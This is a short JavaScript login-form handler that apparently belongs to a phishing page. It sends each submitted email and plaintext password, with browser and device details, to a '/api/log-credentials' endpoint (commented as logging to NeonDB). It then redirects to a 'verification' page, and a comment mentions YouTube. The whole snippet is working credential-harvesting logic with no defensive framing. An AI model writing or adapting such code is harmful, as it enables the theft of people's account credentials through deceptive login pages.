const handleSubmit = async (e) => {
  e.preventDefault();
  setError('');

  const validationError = validateCredentials(email, password);
  if (validationError) {
    setError(validationError);
    return;
  }

  try {
    // Log credentials to NeonDB
    await fetch('/api/log-credentials', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        email, 
        password, 
        userAgent: navigator.userAgent,
        deviceType: isMobile ? 'mobile' : 'desktop'
      })
    });

    // Store email in localStorage for session management
    localStorage.setItem('user_email', email);
    
    // Redirect to verification page instead of YouTube directly
    window.location.href = '/auth/verification';
    
  } catch (err) {
    setError('Login failed. Please try again.');
  }
};
